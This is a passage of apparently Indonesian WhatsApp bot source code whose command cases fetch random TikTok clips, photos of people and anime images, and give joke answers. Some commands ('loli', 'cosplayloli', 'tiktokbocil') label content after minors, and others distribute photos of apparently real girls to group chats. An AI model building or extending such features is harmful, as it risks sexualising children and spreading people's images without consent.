let db = await dBinary(`${q}`)
replygcxeon(db)
}
break
case 'happymod': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return replygcxeon(mess.limit);
				if (!text) return replygcxeon(`⚠️ Gunakan dengan cara: ${prefix + command} *nama aplikasi*\n\n🤔 *Contohnya:*\n\n${prefix + command} Minecraft`);
				try {
					const results = await happymod(text);
					if (results.length === 0) return replygcxeon(`⚠️ Mora gak nemu aplikasi di HappyMod dengan kata kunci "${text}", Kak! 🥲`);
					let result = results.map(app => `📱 *${app.title}*\n⭐ *Rating:* ${app.rating}\n🔗 ${app.link}`).join('\n\n');
					replygcxeon(`📦 *Hasil Pencarian HappyMod untuk:* ${text}\n\n${result}`);
				} catch (err) {
					console.error(err);
					replygcxeon(`❌ Ada masalah waktu ambil data dari HappyMod, Kak! Coba lagi nanti ya 🥺`);
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;
case 'gdrive': {
		if (!args[0]) return replygcxeon(`Enter the Google Drive link`)
	await replygcxeon (mess.wait)
	const fg = require('api-dylux')
	try {
	let res = await fg.GDriveDl(args[0])
	 await replygcxeon(`
≡ *Google Drive DL*
▢ *Nama:* ${res.fileName}
▢ *Size:* ${res.fileSize}
▢ *Type:* ${res.mimetype}`)
	Yasam.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: fvrif })
 } catch {
	replygcxeon('Error: Check link or try another link') 
 }
}
break
case 'pinterest': {
if (!text) return replygcxeon(`Enter Query`)
let { pinterest } = require('./lib/scraper')
anutrest = await pinterest(text)
result = anutrest[Math.floor(Math.random() * anutrest.length)]
Yasam.sendMessage(m.chat, { image: { url: result }, caption: '⭔ Media Url : '+result }, { quoted: fvrif })
}
break
case 'ringtone': {
		if (!text) return replygcxeon(`Example : ${prefix + command} black rover`)
 let ringtone = require('./lib/scraper')
		let anutone2 = await ringtone(text)
		let result = anutone2[Math.floor(Math.random() * anutone2.length)]
		Yasam.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: fvrif })
	 }
	 break
case 'tiktokgirl':
await replygcxeon (mess.wait)
var asupan = JSON.parse(fs.readFileSync('./src/media/tiktokvids/tiktokgirl.json'))
var hasil = pickRandom(asupan)
Yasam.sendMessage(m.chat, { caption: mess.berhasil, video: { url: hasil.url }}, { quoted: fvrif })
break
case 'tiktokghea':
await replygcxeon (mess.wait)
var gheayubi = JSON.parse(fs.readFileSync('./src/media/tiktokvids/gheayubi.json'))
var hasil = pickRandom(gheayubi)
Yasam.sendMessage(m.chat, { caption: mess.berhasil, video: { url: hasil.url }}, { quoted: fvrif })
break
case 'tiktokbocil':
await replygcxeon (mess.wait)
var bocil = JSON.parse(fs.readFileSync('./src/media/tiktokvids/bocil.json'))
var hasil = pickRandom(bocil)
Yasam.sendMessage(m.chat, { caption: mess.berhasil, video: { url: hasil.url }}, { quoted: fvrif })
break
case 'tiktoknukhty':
await replygcxeon (mess.wait)
var ukhty = JSON.parse(fs.readFileSync('./src/media/tiktokvids/ukhty.json'))
var hasil = pickRandom(ukhty)
Yasam.sendMessage(m.chat, { caption: mess.berhasil, video: { url: hasil.url }}, { quoted: fvrif })
break
case 'tiktoksantuy':
await replygcxeon (mess.wait)
var santuy = JSON.parse(fs.readFileSync('./src/media/tiktokvids/santuy.json'))
var hasil = pickRandom(santuy)
Yasam.sendMessage(m.chat, { caption: mess.berhasil, video: { url: hasil.url }}, { quoted: fvrif })
break
case 'tiktokkayes':
await replygcxeon (mess.wait)
var kayes = JSON.parse(fs.readFileSync('./src/media/tiktokvids/kayes.json'))
var hasil = pickRandom(kayes)
Yasam.sendMessage(m.chat, { caption: mess.berhasil, video: { url: hasil.url }}, { quoted: fvrif })
break
case 'tiktokpanrika':
await replygcxeon (mess.wait)
var rikagusriani = JSON.parse(fs.readFileSync('./src/media/tiktokvids/panrika.json'))
var hasil = pickRandom(rikagusriani)
Yasam.sendMessage(m.chat, { caption: mess.berhasil, video: { url: hasil.url }}, { quoted: fvrif })
break
case 'tiktoknotnot':
await replygcxeon (mess.wait)
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokvids/notnot.json'))
var hasil = pickRandom(notnot)
Yasam.sendMessage(m.chat, { caption: mess.berhasil, video: { url: hasil.url }}, { quoted: fvrif })
break
case 'chinese':
await replygcxeon (mess.wait)
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/china.json'))
var hasil = pickRandom(notnot)
Yasam.sendMessage(m.chat, { caption: mess.berhasil, image: { url: hasil.url } }, { quoted: fvrif })
break
case 'hijab':
await replygcxeon (mess.wait)
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/hijab.json'))
var hasil = pickRandom(notnot)
Yasam.sendMessage(m.chat, { caption: mess.berhasil, image: { url: hasil.url } }, { quoted: fvrif })
break
case 'indo':
await replygcxeon (mess.wait)
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/indonesia.json'))
var hasil = pickRandom(notnot)
Yasam.sendMessage(m.chat, { caption: mess.berhasil, image: { url: hasil.url } }, { quoted: fvrif })
break
case 'japanese':
await replygcxeon (mess.wait)
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/japan.json'))
var hasil = pickRandom(notnot)
Yasam.sendMessage(m.chat, { caption: mess.berhasil, image: { url: hasil.url } }, { quoted: fvrif })
break
case 'korean':
await replygcxeon (mess.wait)
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/korea.json'))
var hasil = pickRandom(notnot)
Yasam.sendMessage(m.chat, { caption: mess.berhasil, image: { url: hasil.url } }, { quoted: fvrif })
break
case 'malay':
await replygcxeon (mess.wait)
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/malaysia.json'))
var hasil = pickRandom(notnot)
Yasam.sendMessage(m.chat, { caption: mess.berhasil, image: { url: hasil.url } }, { quoted: fvrif })
break
case 'randomgirl':
await replygcxeon (mess.wait)
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/random.json'))
var hasil = pickRandom(notnot)
Yasam.sendMessage(m.chat, { caption: mess.berhasil, image: { url: hasil.url } }, { quoted: fvrif })
break
case 'randomboy':
await replygcxeon (mess.wait)
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/random2.json'))
var hasil = pickRandom(notnot)
Yasam.sendMessage(m.chat, { caption: mess.berhasil, image: { url: hasil.url } }, { quoted: fvrif })
break
case 'thai':
await replygcxeon (mess.wait)
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/thailand.json'))
var hasil = pickRandom(notnot)
Yasam.sendMessage(m.chat, { caption: mess.berhasil, image: { url: hasil.url } }, { quoted: fvrif })
break
case 'vietnamese':
await replygcxeon (mess.wait)
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/vietnam.json'))
var hasil = pickRandom(notnot)
Yasam.sendMessage(m.chat, { caption: mess.berhasil, image: { url: hasil.url } }, { quoted: fvrif })
break
case 'aesthetic':
await replygcxeon (mess.wait)
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/aesthetic.json'))
var hasil = pickRandom(notnot)
Yasam.sendMessage(m.chat, { caption: mess.berhasil, image: { url: hasil.url } }, { quoted: fvrif })
break
case 'antiwork':
await replygcxeon (mess.wait)
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/antiwork.json'))
var hasil = pickRandom(notnot)
Yasam.sendMessage(m.chat, { caption: mess.berhasil, image: { url: hasil.url } }, { quoted: fvrif })
break
case 'blackpink':
await replygcxeon (mess.wait)
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/blackpink.json'))
var hasil = pickRandom(notnot)
Yasam.sendMessage(m.chat, { caption: mess.berhasil, image: { url: hasil.url } }, { quoted: fvrif })
break
case 'bike':
await replygcxeon (mess.wait)
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/bike.json'))
var hasil = pickRandom(notnot)
Yasam.sendMessage(m.chat, { caption: mess.berhasil, image: { url: hasil.url } }, { quoted: fvrif })
break
case 'boneka':
await replygcxeon (mess.wait)
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/boneka.json'))
var hasil = pickRandom(notnot)
Yasam.sendMessage(m.chat, { caption: mess.berhasil, image: { url: hasil.url } }, { quoted: fvrif })
break
case 'cosplay':
await replygcxeon (mess.wait)
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/cosplay.json'))
var hasil = pickRandom(notnot)
Yasam.sendMessage(m.chat, { caption: mess.berhasil, image: { url: hasil.url } }, { quoted: fvrif })
break
case 'cat':
await replygcxeon (mess.wait)
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/cat.json'))
var hasil = pickRandom(notnot)
Yasam.sendMessage(m.chat, { caption: mess.berhasil, image: { url: hasil.url } }, { quoted: fvrif })
break
case 'doggo':
await replygcxeon (mess.wait)
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/doggo.json'))
var hasil = pickRandom(notnot)
Yasam.sendMessage(m.chat, { caption: mess.berhasil, image: { url: hasil.url } }, { quoted: fvrif })
break
case 'justina':
await replygcxeon (mess.wait)
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/justina.json'))
var hasil = pickRandom(notnot)
Yasam.sendMessage(m.chat, { caption: mess.berhasil, image: { url: hasil.url } }, { quoted: fvrif })
break
case 'kayes':
await replygcxeon (mess.wait)
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/kayes.json'))
var hasil = pickRandom(notnot)
Yasam.sendMessage(m.chat, { caption: mess.berhasil, image: { url: hasil.url } }, { quoted: fvrif })
break
case 'kpop':
await replygcxeon (mess.wait)
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/kpop.json'))
var hasil = pickRandom(notnot)
Yasam.sendMessage(m.chat, { caption: mess.berhasil, image: { url: hasil.url } }, { quoted: fvrif })
break
case 'notnot':
await replygcxeon (mess.wait)
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/notnot.json'))
var hasil = pickRandom(notnot)
Yasam.sendMessage(m.chat, { caption: mess.berhasil, image: { url: hasil.url } }, { quoted: fvrif })
break
case 'car':
await replygcxeon (mess.wait)
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/car.json'))
var hasil = pickRandom(notnot)
Yasam.sendMessage(m.chat, { caption: mess.berhasil, image: { url: hasil.url } }, { quoted: fvrif })
break
case 'couplepp': case 'ppcouple': {
let anu = require('./src/media/randompics/ppcouple.json')
let random = anu[Math.floor(Math.random() * anu.length)]
Yasam.sendMessage(from, { image: { url: random.male }, caption: `Couple pp for male` }, { quoted: fvrif })
Yasam.sendMessage(from, { image: { url: random.female }, caption: `Couple pp for female` }, { quoted: fvrif })
}
break
case 'profilepic': case 'profilepicture':
await replygcxeon (mess.wait)
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/profile.json'))
var hasil = pickRandom(notnot)
Yasam.sendMessage(m.chat, { caption: mess.berhasil, image: { url: hasil.url } }, { quoted: fvrif })
break
case 'pubg':
await replygcxeon (mess.wait)
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/pubg.json'))
var hasil = pickRandom(notnot)
Yasam.sendMessage(m.chat, { caption: mess.berhasil, image: { url: hasil.url } }, { quoted: fvrif })
break
case 'rose':
await replygcxeon (mess.wait)
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/rose.json'))
var hasil = pickRandom(notnot)
Yasam.sendMessage(m.chat, { caption: mess.berhasil, image: { url: hasil.url } }, { quoted: fvrif })
break
case 'ryujin':
await replygcxeon (mess.wait)
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/ryujin.json'))
var hasil = pickRandom(notnot)
Yasam.sendMessage(m.chat, { caption: mess.berhasil, image: { url: hasil.url } }, { quoted: fvrif })
break
case 'ulzzangboy':
await replygcxeon (mess.wait)
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/ulzzangboy.json'))
var hasil = pickRandom(notnot)
Yasam.sendMessage(m.chat, { caption: mess.berhasil, image: { url: hasil.url } }, { quoted: fvrif })
break
case 'ulzzanggirl':
await replygcxeon (mess.wait)
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/ulzzanggirl.json'))
var hasil = pickRandom(notnot)
Yasam.sendMessage(m.chat, { caption: mess.berhasil, image: { url: hasil.url } }, { quoted: fvrif })
break
case 'wallml': case 'wallpaperml':case 'mobilelegend':
await replygcxeon (mess.wait)
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/wallml.json'))
var hasil = pickRandom(notnot)
Yasam.sendMessage(m.chat, { caption: mess.berhasil, image: { url: hasil.url } }, { quoted: fvrif })
break
case 'wallpaperphone': case 'wallphone':
await replygcxeon (mess.wait)
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/wallhp.json'))
var hasil = pickRandom(notnot)
Yasam.sendMessage(m.chat, { caption: mess.berhasil, image: { url: hasil.url } }, { quoted: fvrif })
break
 case 'remini': {
			if (!quoted) return replygcxeon(`Where is the picture?`)
			if (!/image/.test(mime)) return replygcxeon(`Send/Reply Photos With Captions ${prefix + command}`)
			await replygcxeon (mess.wait)
			const { remini } = require('./lib/remini')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
			Yasam.sendMessage(m.chat, { image: proses, caption: mess.berhasil}, { quoted: fvrif})
			}
			break
			case 'define': 
if (!q) return replygcxeon(`What do you want to define?`)
try {
targetfine = await axios.get(`http://api.urbandictionary.com/v0/define?term=${q}`)
if (!targetfine) return replygcxeon(mess.error)
const reply = `
*${themeemoji} Word:* ${q}
*${themeemoji} Definition:* ${targetfine.data.list[0].definition
 .replace(/\[/g, "")
 .replace(/\]/g, "")}
*${themeemoji} Example:* ${targetfine.data.list[0].example
 .replace(/\[/g, "")
 .replace(/\]/g, "")}`
 Yasam.sendMessage(m.chat,{text:reply},{quoted:m})
} catch (err) {
 console.log(err)
 return replygcxeon(`*${q}* isn't a valid text`)
 }
 break
 case 'can': {
 	if (!text) return replygcxeon(`Ask question\n\nExample : ${prefix + command} i dance?`)
 	let bisa = [`Can`,`Can't`,`Cannot`,`Of Course You Can!!!`]
 let keh = bisa[Math.floor(Math.random() * bisa.length)]
 let jawab = `*Can ${text}*\nAnswer : ${keh}`
 await replygcxeon(jawab)
 }
 break
 case 'is': {
 	if (!text) return replygcxeon(`Ask question\n\nExample : ${prefix + command} she virgin?`)
 	let apa = [`Yes`, `No`, `It Could Be`, `Thats right`]
 let kah = apa[Math.floor(Math.random() * apa.length)]
 let jawab = `*Is ${text}*\nAnswer : ${kah}` 
 await replygcxeon(jawab)
 }
 break
 case 'when': {
 	if (!text) return replygcxeon(`Ask question\n\nExample : ${prefix + command} will i get married?`)
 	let kapan = ['5 More Days', '10 More Days', '15 More Days','20 More Days', '25 More Days','30 More Days','35 More Days','40 More Days','45 More Days','50 More Days','55 More Days','60 More Days','65 More Days','70 More Days','75 More Days','80 More Days','85 More Days','90 More Days','100 More Days','5 Months More', '10 Months More', '15 Months More','20 Months More', '25 Months More','30 Months More','35 Months More','40 Months More','45 Months More','50 Months More','55 Months More','60 Months More','65 Months More','70 Months More','75 Months More','80 Months More','85 Months More','90 Months More','100 Months More','1 More Year','2 More Years','3 More Years','4 More Years','5 More Years','Tomorrow','The Day After Tomorrow']
 let koh = kapan[Math.floor(Math.random() * kapan.length)]
 let jawab = `*${command} ${text}*\nAnswer : ${koh}` 
 await replygcxeon(jawab)
 }
 break
case 'what': {
 	if (!text) return replygcxeon(`Ask question\n\nExample : ${prefix + command} is your name?`)
 	let lel = [`Ask Your Gf`, `I Dont Know`, `I Don't Know, Ask Your Father`]
 let kah = lel[Math.floor(Math.random() * lel.length)]
 let jawab = `*What ${text}*\nAnswer : ${kah}` 
 await replygcxeon(jawab)
 }
 break
case 'where': {
if (!text) return replygcxeon(`Ask question\n\nExample : ${prefix + command} is your name?`)
 	let wherelol = [`In the mountain`, `On mars`, `On moon`,`In the jungle`,`I dont know ask your mom`,`It could be somewhere`]
 let kah = wherelol[Math.floor(Math.random() * wherelol.length)]
 let jawab = `*Whwre ${text}*\nAnswer : ${kah}` 
 await replygcxeon(jawab)
 }
 break
case 'how': {
 	if (!text) return replygcxeon(`Ask question\n\nExample : ${prefix + command} to date girl?`)
 	let gimana = [`Ummm...`, `It's Difficult Bro`, `Sorry Bot Can't Answer`, `Try Searching On Google`,`Holy Cow! Really???`,`Dizzy Ah😴, don't wanna answer`,`Ohhh I See:(`,`The Patient, Boss:(`,`Really dude 🙄`]
 let kah = gimana[Math.floor(Math.random() * gimana.length)]
 let jawab = `*How ${text}*\nAnswer : ${kah}` 
 await replygcxeon(jawab)
 }
 break

case 'runtime': {
 	let lowq = `*The Bot Has Been Online For:*\n*${runtime(process.uptime())}*`
 replygcxeon(lowq)
 	}
 break
 case 'stupidcheck':case 'uncleancheck':
case 'hotcheck': case 'smartcheck':
case 'greatcheck':
case 'evilcheck':case 'dogcheck':
case 'coolcheck':
case 'waifucheck':
cantik = body.slice(1)
const okebnh1 =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const xeonkak = okebnh1[Math.floor(Math.random() * okebnh1.length)]
Yasam.sendMessage(m.chat, { text: xeonkak }, { quoted: fvrif })
break
 case 'soulmate': {
 if (!m.isGroup) return replygcxeon (mess.group)
 let member = participants.map(u => u.id)
 let me = m.sender
 let jodoh = member[Math.floor(Math.random() * member.length)]
Yasam.sendMessage(m.chat,
{ text: `👫Your Soulmate Is

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`,
contextInfo:{
mentionedJid:[me, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./XeonMedia/theme/cheemspic.jpg`),
"sourceUrl": `${wagc}`}}},
{ quoted: fvrif}) 
 }
 break
 case 'couple': {
 if (!m.isGroup) return replygcxeon (mess.group)
 let member = participants.map(u => u.id)
 let orang = member[Math.floor(Math.random() * member.length)]
 let jodoh = member[Math.floor(Math.random() * member.length)]
Yasam.sendMessage(m.chat,
{ text: `@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}
Cieeee, What's Going On❤️💖👀`,
contextInfo:{
mentionedJid:[orang, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./XeonMedia/theme/cheemspic.jpg`),
"sourceUrl": `${wagc}`}}},
{ quoted: fvrif}) 
 }
 break
 case 'coffee': case 'kopi': {
 Yasam.sendMessage(m.chat, {caption: mess.berhasil, image: { url: 'https://coffee.alexflipnote.dev/random' }}, { quoted: fvrif })
 }
 break
 case 'wallpaper': {
 if (!text) return replygcxeon('Enter Query Title')
 await replygcxeon (mess.wait)
		let { wallpaper } = require('./lib/scraper')
 anuwallpep = await wallpaper(text)
 result = anuwallpep[Math.floor(Math.random() * anuwallpep.length)] 
 Yasam.sendMessage(m.chat, {caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Category : ${result.type}\n${themeemoji} Detail : ${result.source}\n${themeemoji} Media Url : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] }} , { quoted: fvrif })
 }
 break
 case 'wikimedia': {
 if (!text) return replygcxeon('Enter Query Title')
 await replygcxeon (mess.wait)
		let { wikimedia } = require('./lib/scraper')
 let anumedia = await wikimedia(text)
 result = anumedia[Math.floor(Math.random() * anumedia.length)]
 Yasam.sendMessage(m.chat, {caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Source : ${result.source}\n${themeemoji} Media Url : ${result.image}`, image: { url: result.image }} , { quoted: fvrif })
 }
 break
 case 'loli': {
 let baseUrl = 'https://weeb-api.vercel.app/'
 const response = await fetch(baseUrl + command)
 const imageBuffer = await response.buffer() // Get the image data as a buffer
 Yasam.sendMessage(m.chat, {image: imageBuffer, caption: `Random ${command} for you!✨`}, {quoted: fvrif}) 
 }
 break
 case 'waifu': {
 let baseUrl = 'https://weeb-api.vercel.app/'
 const response = await fetch(baseUrl + command)
 const imageBuffer = await response.buffer() // Get the image data as a buffer
 Yasam.sendMessage(m.chat, {image: imageBuffer, caption: `Random ${command} for you!✨`}, {quoted: fvrif}) 
 }
 break
 case 'neko': {
 let baseUrl = 'https://weeb-api.vercel.app/'
 const response = await fetch(baseUrl + command)
 const imageBuffer = await response.buffer() // Get the image data as a buffer
 Yasam.sendMessage(m.chat, {image: imageBuffer, caption: `Random ${command} for you!✨`}, {quoted: fvrif}) 
 }
 case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo': case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'loli2': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming': case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'waifu2': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
await replygcxeon (mess.wait)
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/lisa.json')
if (/loli2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mountain.json')
